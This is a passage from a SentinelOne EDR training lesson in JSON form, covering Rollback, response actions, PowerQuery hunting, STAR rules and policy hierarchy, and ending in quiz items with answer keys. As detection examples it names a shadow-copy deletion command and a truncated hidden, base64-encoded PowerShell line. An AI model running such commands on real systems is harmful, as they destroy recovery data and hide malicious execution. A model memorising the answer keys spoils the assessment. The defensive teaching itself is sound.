continuing.\n\n### Why this taxonomy matters for a shift handoff\n\nAn incoming analyst picking up a queue of open Threats needs to know, at a glance, which ones already had an automatic action taken and which are still fully live and awaiting a human decision — a Not Mitigated Critical Threat sitting untouched for even a few minutes deserves very different urgency than a Mitigated one where the process was already killed and the only remaining work is scoping and documentation. Reading the Classification, Confidence, and mitigation status together, rather than reacting to the Risk Level color alone, is what separates efficient triage from working the queue in the wrong order."
      },
      {
        "heading": "Rollback: What VSS Snapshots Actually Undo, and What They Cannot Touch",
        "content": "**Rollback** is the feature most associated with SentinelOne in the market, and it is also the feature analysts most commonly overstate when explaining it to someone else. Understanding precisely what it does — and, just as importantly, what it structurally cannot do — matters both for correct incident response and for setting accurate expectations with stakeholders after a ransomware event.\n\n### The actual mechanism\n\nSentinelOne's agent continuously takes shadow-copy-style snapshots of file changes on protected endpoints, built on the same underlying Windows technology as the Volume Shadow Copy Service (VSS) that Windows itself uses for its own restore points. When a file is modified — including when ransomware encrypts it — the agent has a record of what that file looked like before the change.\n\nRollback, triggered either automatically by the agent in Protect mode or manually by an analyst, uses those snapshots to restore affected files to their pre-attack state. For a ransomware incident specifically, this can mean recovering thousands of encrypted files back to their original, readable content within minutes, without needing to restore from a separate backup system or negotiate with an attacker at all.\n\n### What Rollback genuinely accomplishes\n\nFor the specific damage of file encryption or deletion carried out by a threat SentinelOne detected and stopped, Rollback can be the difference between a contained security incident and a business-halting data-loss event. It operates at the file-content layer, restoring what was overwritten, which is precisely the kind of damage traditional 'kill the process' and 'quarantine the file' actions cannot undo on their own — those actions stop further damage but leave whatever was already encrypted exactly as encrypted as it was the moment before you clicked.\n\n### What Rollback does not do\n\nThis is not a limitation of the feature so much as a limitation of what a file-restore mechanism can ever do. Rollback restores local file content from a snapshot — it does not, and structurally cannot, do the following:\n\n- **Retrieve data that already left the network.** If an attacker exfiltrated a copy of sensitive files to an external server before triggering the encryption — a routine sequence for modern double-extortion ransomware operators — Rollback restores your copy of those files while doing precisely nothing about the copy the attacker already has.\n- **Remove a backdoor, scheduled task, or other persistence mechanism.** Restoring file content does not clean an infected registry key or a rogue service, so a Rollback without a full investigation and remediation of how the attacker got in leaves the door they used wide open for a return visit.\n- **Recover if the underlying snapshot data is gone.** It depends entirely on the snapshot data existing and being intact — an attacker sophisticated enough to specifically target and delete the underlying shadow-copy data before encrypting, a known and documented ransomware technique, can defeat Rollback's recovery capability outright. This is exactly why SentinelOne separately monitors for and flags shadow-copy-deletion commands like vssadmin delete shadows as a red flag in their own right.\n\n### The correct way to describe Rollback to a stakeholder\n\nRollback is a powerful, fast recovery mechanism for the specific problem of files that were encrypted or deleted by a threat this agent stopped — it is not a general 'undo the entire breach' button, and treating it as one leads directly to under-scoping an incident that actually involved data theft, persistence, or credential compromise alongside the encryption Rollback happened to fix."
      },
      {
        "heading": "Deep Visibility and the Response Ladder: Matching the Action to the Damage",
        "content": "**Deep Visibility** is SentinelOne's query interface for hunting across the full-fidelity telemetry every agent records, functionally similar in purpose to CrowdStrike's Threat Graph investigation tools or Microsoft's Advanced Hunting, though with its own query syntax. From Deep Visibility, an analyst can ask questions across the entire fleet at once, for example:\n\n- Which endpoints have ever executed a file with a specific hash?\n- Which processes made a network connection to a specific external IP in the last week?\n- Which endpoints created a file with a specific ransomware extension in the last day?\n\nDeep Visibility stores this telemetry with a long retention window, which matters for a very practical reason — an analyst investigating a suspected intrusion often needs to look back well before the alert that finally triggered, to find the initial access point that generated no alert of its own at the time.\n\n**Writing a useful Deep Visibility query starts the same way any good hunting query does: with a specific question, not a vague sweep.** 'Show me everything suspicious' is not a query Deep Visibility, or any telemetry search tool, can meaningfully answer. 'Show me every process that wrote a file with a .lockbit extension in the last 24 hours, and what process created it' is a question with a concrete, actionable answer, and it is the kind of question Deep Visibility is built to answer quickly across thousands of endpoints simultaneously rather than one machine at a time.\n\n### The response ladder, and why the order matters\n\nSentinelOne offers a set of response actions that form a rough escalation ladder matched to how far an attack has progressed, and choosing the right rung — not simply the most aggressive available action — is a real analytical judgment, not a reflex.\n\n- **Kill Process** — stops a currently running malicious process in memory; it addresses activity happening right now but does nothing about a file already dropped to disk or files already modified.\n- **Quarantine Threat** — moves the malicious file itself into an isolated folder where it cannot execute, addressing the artifact but not necessarily anything it already did before quarantine occurred.\n- **Remediate** — reverses certain system changes the threat made, such as a registry modification or a persistence mechanism it established, restoring the endpoint's configuration closer to its pre-attack state, distinct from restoring file content specifically.\n- **Rollback** — covered in depth in the previous section, restores encrypted or deleted file content using VSS-based snapshots. It is the only action on this ladder that addresses damage to file content that has already occurred.\n\n### Why an analyst should not reflexively reach for the most powerful action\n\nRollback and Remediate are more powerful and more disruptive than Kill or Quarantine, and using them when they are not warranted carries real cost — an unnecessary Rollback can revert legitimate file changes a user made after the snapshot was taken but before the malicious activity, and Remediate changes system state in ways that should be verified, not assumed, to be correct.\n\nThe right response to a Threat that was caught and killed before it wrote or modified anything is simply Kill and Quarantine; escalating straight to Rollback when there is nothing to roll back adds risk without adding benefit. Match the action to what the Storyline actually shows happened — a process merely launched and killed needs less intervention than one that had time to rename fifteen thousand files before the agent caught up to it — and you will consistently make better response decisions than an analyst who defaults to the strongest button on the page.",
        "codeExample": "flowchart TD\n  A[\"Threat confirmed - how far did it get?\"] --> B{\"Was the process still running when caught?\"}\n  B -->|\"Yes, in memory only\"| C[\"Kill Process\"]\n  B -->|\"No, file was written to disk\"| D[\"Quarantine Threat\"]\n  D --> E{\"Did it modify system config or persistence?\"}\n  E -->|\"Yes\"| F[\"Remediate - revert system changes\"]\n  E -->|\"No\"| G[\"Done - no further action needed\"]\n  D --> H{\"Were files encrypted or deleted?\"}\n  H -->|\"Yes\"| I[\"Rollback - restore file content from snapshot\"]\n  H -->|\"No\"| G"
      },
      {
        "heading": "Deep Visibility Queries: Hunting the Raw Telemetry with PowerQuery",
        "content": "You have met **Deep Visibility** as SentinelOne's window into endpoint activity. Its real power emerges when you stop browsing and start **querying** — writing your own searches across the raw telemetry rather than only reading the Storylines the agent assembled. SentinelOne's query language for this is **PowerQuery**, and fluency in it is what separates an analyst who consumes SentinelOne's conclusions from one who interrogates its data.\n\nThe distinction matters, and it echoes the Falcon and SIEM lessons: a **Storyline** is the agent's *narrative* of one attack; the raw Deep Visibility events are *everything that happened*, narrative or not. Querying that raw layer lets you:\n\n- **Hunt across the whole fleet for a behaviour**, not just review one flagged Storyline — \"find every endpoint where this parent-child process pair occurred,\" run as a PowerQuery, even when nothing alerted.\n- **Pivot at scale.** Take one indicator from an incident and query every endpoint that saw it, bounding the true scope — the mechanical pivoting of the analyst-mindset lesson, executed against months of retained telemetry.\n- **Aggregate to find outliers.** PowerQuery supports the grouping and counting that turns \"read the events\" into \"stack them and surface the rarest,\" which is the frequency-analysis backbone of hunting.\n\nThe practical skills are the same everywhere: know which **event types** hold which facts (process, file, network, DNS, registry, logon) — in PowerQuery's own dot-notation, fields such as `event.type`, `src.process.name`, and `endpoint.name` — filter hard on their fields, and scope tightly by time and endpoint before you read. And as always, a Deep Visibility query that reliably finds something valuable should not stay a one-off — which is exactly what the STAR section below is about: SentinelOne lets you *promote a hunt into a standing, automated rule*. The worked example that follows walks a real PowerQuery, line by line, before STAR turns one into a permanent rule. The lesson to carry: the Storyline is the agent's answer, but PowerQuery over Deep Visibility is how you ask your own questions of the raw evidence."
      },
      {
        "heading": "Worked Example: Hunting Office-to-PowerShell with PowerQuery",
        "content": "Reading about PowerQuery is not the same as running one. Here is a real hunt, step by step, in SentinelOne's own field-naming scheme — dot-notation fields like `src.process.name` and `endpoint.name` are the real names PowerQuery exposes over Deep Visibility telemetry, not invented shorthand.\n\nSuppose you want every case, across the fleet, where a Microsoft Office application spawned PowerShell in the last 7 days — the exact fileless-attack pattern the Behavioral AI section described, but here you are hunting for it directly instead of waiting for a Threat to fire:\n\n```\nevent.type = 'Process Creation'\nand src.process.name = 'powershell.exe'\nand src.process.parent.name in ('winword.exe', 'excel.exe', 'outlook.exe')\n| columns endpoint.name, src.process.parent.name, src.process.cmdline, event.time\n| sort event.time desc\n| limit 20\n```\n\nRead it exactly like the AQL and Event Search pipelines from earlier lessons — top to bottom, each line narrowing the last:\n\n- `event.type = 'Process Creation'` — scope to process-launch events only, the PowerQuery event category for 'something started running'.\n- `src.process.name = 'powershell.exe' and src.process.parent.name in (...)` — keep only PowerShell launches whose parent was Word, Excel, or Outlook, a shape with no legitimate reason to occur during normal document editing.\n- `| columns ...` — show only the fields useful for triage, not the entire raw event.\n- `| sort event.time desc` then `| limit 20` — newest first, capped so the result stays skimmable.\n\nSample result rows might look like this:\n\n```\nendpoint.name   src.process.parent.name   src.process.cmdline                                     event.time\nLT-SALES-08     winword.exe               powershell.exe -nop -w hidden -enc SQBFAFgA...           2026-08-15T11:14:02Z\nLT-LEGAL-19     outlook.exe               powershell.exe -Command Get-Mailbox -Identity user1      2026-08-14T16:30:45Z\n```\n\nSame parent-child shape, two very different stories. The first has a `-w hidden` flag and a base64-encoded (`-enc`) command — a textbook obfuscation pattern with no legitimate business reason to appear after opening a document. The second runs a plain, readable Exchange administrative cmdlet from Outlook, most likely a scheduled mailbox-maintenance script wired through Outlook's automation rather than an attack. This is the habit PowerQuery is built to train: the query gets you a short, relevant list fast, but the `src.process.cmdline` content — not the mere fact that PowerShell has an Office parent — is what actually separates the row worth escalating from the one that is not."
      },
      {
        "heading": "STAR: Turning a Hunt Into an Automated Custom Detection Rule",
        "content": "Finding a threat once with a good query is valuable; having that query *watch for the threat automatically forever* is transformative. SentinelOne's mechanism for this is **STAR — Storyline Active Response** — and understanding it captures a principle that runs through the whole detection-engineering theme: **a hunt that works should graduate into a standing detection.**\n\nThe idea is elegantly direct. You develop and validate a **Deep Visibility / PowerQuery** search that reliably identifies some malicious or unwanted behaviour. With STAR, you **save that query as a custom rule** that the platform then evaluates *continuously against incoming telemetry* — so the next time that behaviour appears on any endpoint, it automatically generates an alert (and, if you choose, triggers a response action) without a human re-running the hunt. Your one-time investigation becomes permanent, automated coverage.\n\nWhy this matters, and the discipline it requires:\n\n- **It closes the loop from hunting to detection.** The analyst-mindset and threat-hunting material stress that hunting surfaces *new* techniques; STAR is how you make sure a technique you found once never slips by unnoticed again. It is the concrete \"save the hunt as a rule\" step, built into the console.\n- **It is detection-as-code's cousin.** A STAR rule is a reviewed, saved, repeatable artifact — the same durability the Sigma/detection-as-code section argued for, expressed in SentinelOne's native form. Custom detections you author outlast the analyst who wrote them.\n- **It carries the tuning obligation.** A STAR rule built on a noisy query becomes a noisy alert source, and one wired to an automatic response can act on a false positive at machine speed. So the same rule applies as everywhere: validate the query's fidelity first, start in a detect/alert posture before enabling automated response, and treat each rule as something to maintain, not set-and-forget.\n\nThe takeaway ties SentinelOne's autonomy theme to the analyst's craft: the agent already responds autonomously to *known* threats, and STAR extends that autonomy to threats *you* define — letting you encode your environment-specific knowledge into the platform so your best hunts run themselves. Hunting finds it once; STAR makes the platform find it every time after."
      },
      {
        "heading": "Beyond the Endpoint: Ranger and Singularity XDR",
        "content": "Like every EDR, SentinelOne's endpoint agent has the structural blind spots the EDR lesson named — it sees managed hosts and little else. SentinelOne addresses this with two complementary extensions worth knowing, because they turn \"the endpoint agent\" into a wider picture: **Ranger** for the network it can't see, and **Singularity XDR** for the domains beyond the endpoint entirely.\n\n**Ranger** tackles the unmanaged-device blind spot in a clever way: it uses your **existing SentinelOne agents as network sensors** to discover *other* devices on the same networks — with no new hardware or separate scanner. Because a managed endpoint can observe its local network, the fleet collectively maps what else is out there: unmanaged laptops, IoT devices, rogue devices an attacker may have plugged in, printers, and more. This directly answers the \"you can't protect what you can't see\" problem for endpoints — Ranger reveals the machines that *don't* have an agent, which are exactly where attackers pivot to escape endpoint visibility, and can help push protection onto them.\n\n**Singularity XDR** is SentinelOne's answer to the breadth problem the EDR lesson framed: it **extends detection and response beyond the endpoint** by ingesting and correlating telemetry from other domains — identity, cloud, network, email, and third-party tools via its marketplace of integrations — into the same Storyline-style, correlated view. The value is the same as XDR generally: an attack that crosses from a phishing email to an endpoint to a cloud login appears as *one connected story* rather than disconnected fragments in separate tools. SentinelOne's particular flavour extends its automatic-correlation (Storyline) philosophy across those additional data sources.\n\nFor the analyst, these change what you can conclude and where you pivot:\n\n- **A clean endpoint view is not a clean environment view.** When SentinelOne shows nothing on managed hosts, Ranger's picture of unmanaged devices and the XDR correlation across identity and cloud are where the rest of the story may live — the \"change sensors\" discipline from the EDR lesson, delivered inside one platform.\n- **Correlated detection reduces manual stitching.** As with XDR generally, alerts that already span endpoint, identity, and cloud arrive pre-connected, so you spend your effort on judgment rather than on assembling fragments by hand.\n\nThe through-line: SentinelOne's endpoint autonomy is its core, but **Ranger extends its eyes to the devices it doesn't manage, and Singularity XDR extends them to the domains beyond the endpoint** — the platform's way of confronting the same blind spots every EDR has, so that \"the agent sees nothing\" is a prompt to look at the wider picture, not a conclusion that nothing happened."
      },
      {
        "heading": "Console Hierarchy: Global, Account, Site, and Group Policy Inheritance",
        "content": "Before any policy setting in SentinelOne means anything, you need to know *where in the console's structure* that setting actually lives, because the same-looking policy screen can represent a fleet-wide default or a narrow, one-off override depending on which level you are looking at. SentinelOne organizes every managed endpoint into a four-level scope hierarchy: **Global**, **Account**, **Site**, and **Group** — each level nested inside the one above it, from the entire tenant down to a specific cluster of similar machines.\n\n### How inheritance actually flows\n\nBy default, every level inherits its policy from the level directly above it: a Site inherits from its Account, which inherits from Global, and a Group inherits from whichever Site it belongs to. This is deliberately a 'set once, deploy everywhere' model — a security team can define a sensible default at the Global or Account level and have it automatically apply everywhere beneath it, without manually configuring every individual Site.\n\nThe inheritance can be overridden at any level: if a specific Site or Group needs a different policy — say, a more permissive Detect-mode configuration for a legacy application server that cannot tolerate an aggressive automatic response — an administrator can define a policy specific to that one Site or Group, and only that scope's endpoints are affected, leaving every sibling Site or Group still inheriting the broader default undisturbed.\n\n| Level | Scope | Typical use |\n| --- | --- | --- |\n| Global | The entire tenant | Baseline defaults everyone inherits unless overridden |\n| Account | A business unit or customer (in MSSP deployments) | Org-wide policy distinct from other accounts sharing the console |\n| Site | A physical location, business unit, or logical grouping | Location- or department-specific policy needs |\n| Group | A cluster of similar endpoints within a Site | Asset-type-specific policy (servers vs. workstations vs. kiosks) |\n\n### Why this matters when you are triaging, not just administering\n\nWhen a Threat's mitigation status looks softer than you expected — the same class of question the CrowdStrike lesson raises about Prevention Policy mode — the first thing worth checking is not just whether the endpoint is in Detect or Protect mode in isolation, but *which level of the hierarchy actually set that mode* for this specific endpoint's Group. A Group-level override quietly left in Detect mode, sitting underneath a Site and Account that both correctly show Protect mode in their own settings, produces exactly the same console-level confusion the Falcon lesson warned about with Host Group policy mismatches: the global-looking settings page can hide a meaningfully different configuration at a level you have not checked yet.\n\n### Exclusions follow the same hierarchy\n\nExclusions and blocklists can be defined at any level of this same hierarchy, following the identical inheritance logic — a global exclusion for a known-safe internal tool propagates everywhere at once, while a Site-specific exclusion for a piece of software unique to one location or business unit stays contained to that Site alone, without needing a separate exclusion repeated across every other Site's policy.",
        "codeExample": "flowchart TD\n  A[\"Global Policy (tenant default)\"] --> B[\"Account: Acme Corp\"]\n  B --> C[\"Site: Chicago HQ\"]\n  B --> D[\"Site: Legacy Manufacturing Plant\"]\n  C --> E[\"Group: Standard Workstations\\n(inherits Site policy - Protect mode)\"]\n  D --> F[\"Group: Legacy App Servers\\n(OVERRIDE: Detect mode only)\"]\n  F -.->|\"Override reason\"| G[\"Legacy app incompatible with\\nautomatic response actions\"]"
      },
      {
        "heading": "Firewall Control and Device Control: Network and Peripheral Policy",
        "content": "Storyline, Threats, and the response ladder all govern what SentinelOne does about a *process*. Two further modules extend the platform's control to the network connection and the physical device layer, and both matter to an analyst because they explain outcomes that never appear as a Threat card at all.\n\n### Firewall Control\n\nWhen SentinelOne's **Firewall Control** (also called Network Control) is enabled on an endpoint, the SentinelOne Agent becomes the *active* firewall on that machine, overriding the operating system's native firewall — on Windows, this means the SentinelOne-managed rules take over from Windows Firewall rather than running alongside it. Firewall rules are organized into a policy and evaluated in top-down order: the first rule that matches a given piece of traffic determines whether it is allowed or blocked, and every rule beneath that first match is never evaluated for that traffic — the identical precedence-ordering behavior the Falcon lesson describes for its own Firewall Management module. Rules can be scoped by protocol, port, application, and direction, and can be defined once and applied consistently across Windows, macOS, and Linux endpoints from the same console.\n\n### Device Control\n\n**Device Control** governs removable media the same way it does in every EDR platform covered on this platform: administrators define rules matching a device by **Vendor ID**, **Class**, **Serial ID**, or **Product ID**, and assign each match an action — **Allow Read & Write**, **Allow Read** (read-only), or **Block** outright. As with Falcon's equivalent module, this closes a channel process-behavior monitoring alone does not cover: a USB drive plugged in and used to copy files off a machine generates no malicious process for Storyline to tag, because no malicious code needs to execute at all for that specific exfiltration path to work.\n\n### Reading a firewall or device-control gap correctly\n\nWhen an investigation reaches 'why did this outbound connection succeed when it should have been blocked' or 'how did this file leave the building with no Threat generated,' the answer frequently is not a failure of Behavioral AI or Static AI at all — those engines were never the layer responsible for stopping that specific channel. Firewall Control and Device Control sit beside the detection engines, not underneath them, and a gap in either one requires checking that module's own policy and rule ordering directly, the same way a Falcon analyst would check Firewall Management or Device Control policy rather than re-reading the Detections list a second time.",
        "codeExample": "// Firewall Control - rules evaluated top-to-bottom, first match wins\nFirewallPolicy {\n  rules: [\n    { order: 1, match: \"any outbound HTTPS\", action: \"Allow\" },       // broad, matches first\n    { order: 2, match: \"outbound to 185.10.44.0/24\", action: \"Block\" } // never reached for HTTPS traffic\n  ]\n}\n\n// Device Control - matched by Vendor/Class/Serial/Product ID\nDeviceControlPolicy {\n  defaultAction: \"Block\",\n  rules: [\n    { matchBy: \"class\", value: \"USB Mass Storage\", action: \"Block\" },\n    { matchBy: \"serialId\", value: \"SN-77120-CORP\", action: \"AllowReadWrite\" }\n  ]\n}"
      },
      {
        "heading": "RemoteOps: Scripted Response and Forensic Collection at Fleet Scale",
        "content": "The response ladder covered earlier — Kill, Quarantine, Remediate, Rollback — operates on one Threat, on one endpoint at a time. **RemoteOps**, built on SentinelOne's **Remote Script Orchestration (RSO)** capability, exists for the different problem of acting across dozens or hundreds of endpoints simultaneously, without an analyst repeating the same manual action once per machine.\n\n### What RemoteOps actually does\n\nFrom the console or through the API, an analyst can push and execute scripts, collect forensic artifacts, and install or uninstall software or IR tooling across a targeted set of endpoints — spanning Windows, macOS, and Linux from the same interface — all in one orchestrated action rather than a manual, machine-by-machine effort. SentinelOne ships a **Script Library** of pre-built scripts covering common investigative and remediation tasks, and a security team can add their own custom scripts specific to their environment, the same authoring pattern the STAR section already introduced for custom detections, applied here to custom response actions instead.\n\n### Why fleet-scale matters, concretely\n\nConsider an Incident where Deep Visibility confirms the same malicious PowerShell pattern executed on forty endpoints across three Sites within a ten-minute window — a credential-harvesting script pushed through a compromised software-deployment tool, for example. Manually opening forty separate response sessions, one per host, and running the same collection or remediation commands forty times, does not scale to the actual timeline an active incident demands. RemoteOps lets an analyst target all forty endpoints as one operation: collect a specific forensic artifact from each simultaneously, or push and run a single remediation script across the entire affected set at once.\n\n### RemoteOps versus the single-endpoint response ladder\n\nRemoteOps is not a replacement for Kill, Quarantine, Remediate, and Rollback — it is the mechanism that lets those same categories of action, or a fully custom script, operate at the scale an incident's actual blast radius requires. The judgment principle from the response-ladder section still applies without modification: match the action to what actually happened, do not push a disruptive script to a hundred endpoints because it feels decisive, and validate any custom script narrowly before it runs fleet-wide, exactly the same audit-before-automate discipline that governs STAR rules and, in the Falcon lesson, RTR's put and run commands.",
        "codeExample": "flowchart TD\n  A[\"Deep Visibility confirms same malicious pattern\\non 40 endpoints across 3 Sites\"] --> B[\"RemoteOps: target all 40 as one operation\"]\n  B --> C[\"Collect forensic artifact\\n(simultaneously, all 40 endpoints)\"]\n  B --> D[\"Push + run remediation script\\n(simultaneously, all 40 endpoints)\"]\n  C --> E[\"Analyst reviews collected artifacts centrally\"]\n  D --> F[\"Analyst confirms remediation succeeded\\nvia Storyline/Threat status per endpoint\"]"
      },
      {
        "heading": "Singularity Identity: Deception-Based Defense for Active Directory",
        "content": "Ranger, covered earlier, extends SentinelOne's visibility to unmanaged devices on the network. **Singularity Identity** extends it in a different direction entirely: into the identity plane, specifically Active Directory and Azure AD/Entra ID, and it does so using a technique the endpoint agent itself does not employ anywhere else in this lesson — **deception**.\n\n### The core mechanism: planted decoys, not just monitoring\n\nWhere Behavioral AI watches real processes for real malicious behavior, Singularity Identity's Active Directory protection works by planting **fake credentials, decoy accounts, and false information directly into the identity infrastructure** an attacker would naturally reconnoiter after gaining an initial foothold. An attacker running discovery commands against Active Directory — enumerating accounts, hunting for privileged credentials to escalate with, exactly the reconnaissance behavior covered in the AD attack-technique lessons elsewhere on this platform — cannot distinguish a planted decoy account from a genuine one using the same tools and queries they would normally rely on.\n\nWhen the attacker interacts with a decoy — attempting to authenticate with a fake credential, querying a lure account's attributes — that interaction itself is the detection: no behavioral scoring or process analysis is required, because no legitimate user or process has any reason to ever touch a decoy in the first place. This is a fundamentally different detection philosophy than everything else covered in this lesson: instead of scoring behavior for suspicion, it makes malicious reconnaissance self-identifying by luring it into a trap a legitimate identity workflow would never enter.\n\n### What it protects specifically\n\nSingularity Identity's Active Directory protection covers domain controllers and domain-joined assets against privilege-escalation attacks, and specifically protects privileged AD credentials from theft by hiding the real ones from attacker view and surfacing decoys in their place — directing credential-theft and lateral-movement attempts toward dead ends instead of toward the genuine privileged accounts an attacker is actually hunting for.\n\n### Why this belongs in an EDR analyst's mental model\n\nThe endpoint agent, however capable, is structurally blind to what happens inside Active Directory itself — an attacker who has already compromised one endpoint and pivots to enumerate the domain is operating in a space Storyline and Deep Visibility were never built to observe directly. Singularity Identity is SentinelOne's answer to that exact blind spot, the identity-plane counterpart to Ranger's network-plane answer to unmanaged devices: when an investigation's endpoint evidence points toward 'and then they went after the domain,' Singularity Identity is where that half of the story, and the tripwire that may have already caught it, actually lives."
      }
    ],
    "keyTakeaways": [
      "SentinelOne's agent makes detection and, in Protect mode, response decisions locally on the device using Static AI, Behavioral AI, and Deep Visibility telemetry — a connectivity gap is not automatically a protection gap, but Detect mode versus Protect mode is a real tradeoff worth checking per host.",
      "Storyline automatically tags every causally related event with a shared StorylineID, turning what would be dozens of disconnected alerts into one readable attack narrative — read it from the root event forward, and still verify the specific step your response decision hinges on.",
      "A Threat's mitigation status (Not Mitigated, Mitigated, Marked Benign, Rollback Available, Rolled Back) is a state that changes as an incident is worked, and it should drive shift-handoff priority more than the Risk Level color alone.",
      "Rollback restores local file content from VSS-based snapshots — it can undo ransomware encryption on files this agent stopped, but it cannot retrieve data already exfiltrated, cannot remove persistence the attacker established, and can be defeated outright if the attacker deleted the shadow-copy data first.",
      "The response ladder — Kill, Quarantine, Remediate, Rollback — should be matched to what the Storyline shows actually happened, not defaulted to the most powerful action available; escalating past what the damage warrants adds risk without adding benefit.",
      "A Storyline is the agent's narrative of one attack, but Deep Visibility + PowerQuery let you query the RAW telemetry directly — hunt a behaviour across the fleet with no existing rule, pivot one indicator at scale, and aggregate for outliers; and STAR (Storyline Active Response) promotes a validated query into a standing custom rule that runs continuously and auto-alerts/responds, the native 'save the hunt as a detection' with the usual tune-before-you-automate discipline.",
      "SentinelOne's endpoint agent has the usual EDR blind spots, addressed by two extensions: Ranger uses existing agents as network sensors to discover UNMANAGED/rogue devices (no new hardware), and Singularity XDR correlates identity, cloud, network, and email telemetry into one Storyline-style view — so a clean managed-endpoint view is NOT a clean environment view; pivot to Ranger and XDR when the endpoint runs out."
    ],
    "quiz": [
      {
        "question": "SentinelOne tags every event in a single attack chain - the initial macro, the PowerShell child process, the file write, and the outbound connection - with the same StorylineID. Compared to receiving four separate, disconnected alerts, what does this primarily save the analyst?",
        "options": [
          {
            "label": "The manual work of correlating unrelated-looking alerts into one timeline before understanding what actually happened",
            "value": "a"
          },
          {
            "label": "The need to ever open the Deep Visibility query interface again for any future investigation on that endpoint",
            "value": "b"
          },
          {
            "label": "The requirement to assign a severity level to the threat, since Storyline sets severity independently of alerts",
            "value": "c"
          },
          {
            "label": "The obligation to isolate the endpoint, since Storyline automatically isolates any host with a live StorylineID",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "Storyline's core value is automating the correlation work an analyst would otherwise do by hand, reconstructing which events belong to the same chain from timestamps and process IDs. Option b overstates the feature — Deep Visibility remains useful for hunting beyond a single Storyline. Option c and d describe capabilities Storyline does not have; it links events, it does not set severity or trigger isolation on its own."
      },
      {
        "question": "A SentinelOne agent successfully rolls back a ransomware encryption event on a laptop using its VSS-based snapshots, restoring the encrypted files. The attacker had also exfiltrated a copy of those files to an external server twelve minutes before encryption began. What does Rollback accomplish here, and what does it not?",
        "options": [
          {
            "label": "It restores local file contents to their pre-attack state, but cannot undo the exfiltration that already left the network",
            "value": "a"
          },
          {
            "label": "It reverses the exfiltration by remotely deleting the stolen copy from the attacker's external server automatically",
            "value": "b"
          },
          {
            "label": "It reinstalls the operating system from a factory image, which also blocks any future connection attempts",
            "value": "c"
          },
          {
            "label": "It permanently revokes the attacker's stolen credentials across every connected identity provider instantly",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "Rollback restores file content from local snapshots — it has no mechanism to reach an external server the attacker controls, so exfiltrated data already off the network stays exfiltrated regardless of a successful local restore. Option b describes a capability Rollback does not have. Option c and d describe unrelated actions no version of Rollback performs."
      },
      {
        "question": "A SentinelOne alert is confirmed malicious but the file has already written several additional files to disk and modified two of them via encryption. Which response action addresses the encrypted files specifically, beyond simply stopping the running process?",
        "options": [
          {
            "label": "Rollback, since it is the action designed to restore file content that was already changed, not just stop execution",
            "value": "a"
          },
          {
            "label": "Kill Process, since terminating the process automatically restores every file it had already modified on disk",
            "value": "b"
          },
          {
            "label": "Quarantine, since moving the malicious file to an isolated folder also reverts any files it previously encrypted",
            "value": "c"
          },
          {
            "label": "Isolate Network, since cutting network access retroactively decrypts files that were already locked by ransomware",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "Rollback is the only action on the response ladder that restores file content already changed, using VSS-based snapshots taken before the modification. Kill Process and Quarantine stop further damage but do not reverse damage already done, and Isolate Network only cuts connectivity — none of the three distractors actually touches already-encrypted file content."
      },
      {
        "question": "An analyst develops a Deep Visibility / PowerQuery search that reliably catches a specific malicious behaviour in their environment. They want this behaviour to be caught automatically in the future without re-running the hunt manually. Which SentinelOne capability does this, and what principle does it embody?",
        "options": [
          {
            "label": "There is no such capability, so the analyst must manually re-run the Deep Visibility query by hand every single day forever, because SentinelOne hunts cannot be saved or automated in any form",
            "value": "a"
          },
          {
            "label": "STAR (Storyline Active Response): save the validated query as a custom rule that the platform evaluates continuously against incoming telemetry, auto-alerting (and optionally responding) on future matches — embodying 'a hunt that works should graduate into a standing detection'",
            "value": "b"
          },
          {
            "label": "Rollback, because rolling back the endpoint to a snapshot is the standard way to make a one-time hunting query permanently monitor for a behaviour across the whole fleet going forward",
            "value": "c"
          },
          {
            "label": "The only option is to email the query text to every other analyst so they can each memorise it, since automated custom detection from a hunt is not something any EDR platform supports",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "STAR (Storyline Active Response) lets you save a validated Deep Visibility / PowerQuery search as a custom rule that runs continuously against incoming telemetry, auto-alerting or responding on future matches — turning a one-time hunt into permanent automated coverage. That embodies the detection-engineering principle that a good hunt should graduate into a standing detection, with the usual tuning obligation. Option a denies the capability exists. Option c confuses Rollback (undoing endpoint changes via snapshots) with detection authoring. Option d wrongly claims no platform supports hunt-to-detection."
      },
      {
        "question": "SentinelOne shows no malicious activity on any managed endpoint, but you suspect a rogue unmanaged device was plugged into the network and that identity/cloud activity may be involved. Which SentinelOne extensions address these gaps, and what EDR principle do they reflect?",
        "options": [
          {
            "label": "None are needed, because a clean view of managed endpoints in SentinelOne is complete proof that the entire environment — including unmanaged devices, identity, and cloud — is definitively free of any compromise",
            "value": "a"
          },
          {
            "label": "Ranger uses existing agents to discover unmanaged/rogue devices on the network, and Singularity XDR correlates telemetry from identity, cloud, and other domains — reflecting that an EDR has structural blind spots, so a clean endpoint view is not a clean environment view; change to the sensors that can see",
            "value": "b"
          },
          {
            "label": "The correct fix is to increase the sensitivity of the endpoint agents until they detect the rogue device, since a sufficiently sensitive endpoint agent will eventually see unmanaged devices and cloud logins that never touch a managed host",
            "value": "c"
          },
          {
            "label": "This situation is impossible, because any device on the network necessarily runs a SentinelOne agent and all identity and cloud activity is automatically visible to the endpoint agent by default",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "An EDR is structurally blind to unmanaged devices and to the identity/cloud plane, so a clean endpoint view is not a clean environment view. Ranger turns existing agents into network sensors to discover unmanaged and rogue devices, and Singularity XDR correlates identity, cloud, and other telemetry into one view — SentinelOne's way of implementing the EDR lesson's 'change sensors when you hit a blind spot.' Option a wrongly treats a clean endpoint view as total assurance. Option c misunderstands that agent sensitivity cannot see devices with no agent. Option d denies the reality of unmanaged devices and identity/cloud attacks."
      },
      {
        "question": "A PowerQuery search filters for src.process.parent.name in ('winword.exe','excel.exe','outlook.exe') and src.process.name = 'powershell.exe'. Two matching rows come back with an identical parent-child shape, but one has a plain, readable Exchange cmdlet on its command line and the other has a base64-encoded, hidden-window command line. What does this illustrate about hunting with PowerQuery?",
        "options": [
          {
            "label": "The parent-child relationship alone confirms an attack, so both rows should be treated as confirmed malicious without further review",
            "value": "a"
          },
          {
            "label": "The src.process.cmdline content, not just the fact that PowerShell has an Office parent, is what separates a routine script from an obfuscated attack, so the query narrows the search but does not replace reading the result",
            "value": "b"
          },
          {
            "label": "PowerQuery cannot legitimately return two rows sharing the same parent-child shape, so this result signals a bug in the query",
            "value": "c"
          },
          {
